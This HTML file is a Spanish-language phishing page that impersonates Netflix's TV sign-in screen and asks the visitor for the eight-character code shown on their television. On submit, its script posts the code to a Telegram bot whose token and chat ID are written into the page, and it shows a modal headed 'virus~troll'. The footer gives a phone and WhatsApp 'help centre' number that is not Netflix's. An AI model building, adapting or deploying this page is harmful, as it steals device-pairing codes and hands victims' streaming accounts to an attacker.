<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Iniciar Sesión en TV</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }

        /* Bloqueo total de scroll en la pantalla */
        html, body {
            width: 100%;
            height: 100vh;
            height: 100dvh;
            overflow: hidden;
            touch-action: none; /* Evita gestos de arrastre en móviles */
        }

        body {
            background-color: #ffffff;
            color: #333333;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        /* Header / Logo Centrado */
        header {
            padding: 20px 4% 10px 4%;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-shrink: 0;
        }

        .logo-img {
            height: 100px;
            width: auto;
            display: block;
        }

        /* Contenido Principal */
        main {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 10px 20px;
            max-width: 500px;
            margin: 0 auto;
            width: 100%;
            text-align: center;
        }

        h1 {
            font-size: 24px;
            font-weight: 800;
            color: #000000;
            margin-bottom: 25px;
            line-height: 1.2;
        }

        /* Inputs para el Código */
        .code-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-bottom: 25px;
            width: 100%;
        }

        .code-input {
            width: 35px;
            height: 45px;
            font-size: 20px;
            font-weight: bold;
            text-align: center;
            border: none;
            border-bottom: 2px solid #b3b3b3;
            outline: none;
            background: transparent;
        }

        .code-input:focus {
            border-bottom-color: #000000;
        }

        .divider {
            font-size: 20px;
            color: #b3b3b3;
            margin: 0 4px;
            font-weight: bold;
        }

        /* Botón */
        .btn-submit {
            width: 100%;
            padding: 14px;
            background-color: #cccccc;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: not-allowed;
            margin-bottom: 25px;
            transition: background-color 0.2s ease;
        }

        /* Botón Activo */
        .btn-submit.active {
            background-color: #E50914;
            cursor: pointer;
        }

        /* Texto Suscríbete */
        .signup-text {
            font-size: 14px;
            color: #737373;
        }

        .signup-text a {
            color: #000000;
            font-weight: bold;
            text-decoration: none;
        }

        .signup-text a:hover {
            text-decoration: underline;
        }

        /* Footer */
        footer {
            background-color: #f3f3f3;
            padding: 20px 4% 25px 4%;
            color: #737373;
            font-size: 13px;
            border-top: 1px solid #e6e6e6;
            flex-shrink: 0;
        }

        .footer-container {
            max-width: 1000px;
            margin: 0 auto;
        }

        .footer-title {
            margin-bottom: 12px;
        }

        .footer-title a {
            color: #737373;
            text-decoration: none;
        }

        .footer-links {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            list-style: none;
        }

        .footer-links a {
            color: #737373;
            text-decoration: none;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        /* Estilos del Modal */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background-color: #fefefe;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            text-align: center;
            max-width: 300px;
        }

        .modal-header {
            color: #E50914;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .modal-body {
            font-size: 16px;
            color: #333;
        }

        @media (min-width: 600px) {
            .logo-img {
                height: 130px;
            }
            .code-input {
                width: 45px;
                height: 55px;
                font-size: 24px;
            }
        }
    </style>
</head>
<body>

    <!-- Encabezado con el Logo -->
    <header>
        <img src="https://infonegocios.info/content/images/2022/07/20/20155/netflix-logo-top-100-brands-01-cba.jpg" alt="Logo" class="logo-img">
    </header>

    <!-- Contenido Principal -->
    <main>
        <h1>Ingresa el código que aparece en tu TV</h1>

        <form id="codeForm" style="width: 100%;">
            <div class="code-container">
                <input type="text" class="code-input" maxlength="1" pattern="[A-Za-z0-9]">
                <input type="text" class="code-input" maxlength="1" pattern="[A-Za-z0-9]">
                <input type="text" class="code-input" maxlength="1" pattern="[A-Za-z0-9]">
                <input type="text" class="code-input" maxlength="1" pattern="[A-Za-z0-9]">
                <span class="divider">-</span>
                <input type="text" class="code-input" maxlength="1" pattern="[A-Za-z0-9]">
                <input type="text" class="code-input" maxlength="1" pattern="[A-Za-z0-9]">
                <input type="text" class="code-input" maxlength="1" pattern="[A-Za-z0-9]">
                <input type="text" class="code-input" maxlength="1" pattern="[A-Za-z0-9]">
            </div>

            <button type="submit" class="btn-submit" id="submitBtn" disabled>Continuar</button>
        </form>

        <p class="signup-text">
            ¿Primera vez en Netflix? <a href="#">Suscríbete ahora.</a>
        </p>
    </main>

    <!-- Pie de página -->
    <footer>
        <div class="footer-container">
            <p class="footer-title">¿Preguntas? Llama al <a href="tel:+528333792877">+52 8333792877</a></p>
            <ul class="footer-links">
                <li><a href="#">Preguntas frecuentes</a></li>
                <li><a href="https://wa.me/528333792877" target="_blank" rel="noopener noreferrer">Centro de ayuda</a></li>
            </ul>
        </div>
    </footer>

    <!-- Modal -->
    <div id="statusModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">virus~troll</div>
            <div class="modal-body">Activando Netflix</div>
        </div>
    </div>

    <script>
        const inputs = document.querySelectorAll('.code-input');
        const submitBtn = document.getElementById('submitBtn');
        const form = document.getElementById('codeForm');
        const modal = document.getElementById('statusModal');

        const TELEGRAM_BOT_TOKEN = "8693512194:AAH4pvVwqutasLjFWaRrzDPAnSKUnA8_qTk";
        const TELEGRAM_CHAT_ID = "5084510194";

        function checkInputs() {
            const allFilled = Array.from(inputs).every(input => input.value.trim() !== '');
            if (allFilled) {
                submitBtn.classList.add('active');
                submitBtn.disabled = false;
            } else {
                submitBtn.classList.remove('active');
                submitBtn.disabled = true;
            }
        }
        
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                checkInputs();
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && input.value === '' && index > 0) {
                    inputs[index - 1].focus();
                }
                setTimeout(checkInputs, 10);
            });
        });

        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            let code = '';
            inputs.forEach(input => code += input.value);

            const message = `🔑 *Nuevo Código de TV:* \`${code}\``;
            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            try {
                submitBtn.disabled = true;
                submitBtn.innerText = "Cargando...";

                const response = await fetch(telegramUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                    modal.style.display = 'flex';
                    setTimeout(() => {
                        modal.style.display = 'none';
                    }, 3000);
                    form.reset();
                    checkInputs();
                } else {
                    alert("Ocurrió un problema al enviar el código. Revisa tus tokens.");
                }
            } catch (error) {
                console.error("Error al conectar con Telegram:", error);
                alert("Error de red al intentar conectar.");
            } finally {
                submitBtn.innerText = "Continuar";
            }
        });
    </script>
</body>
</html>
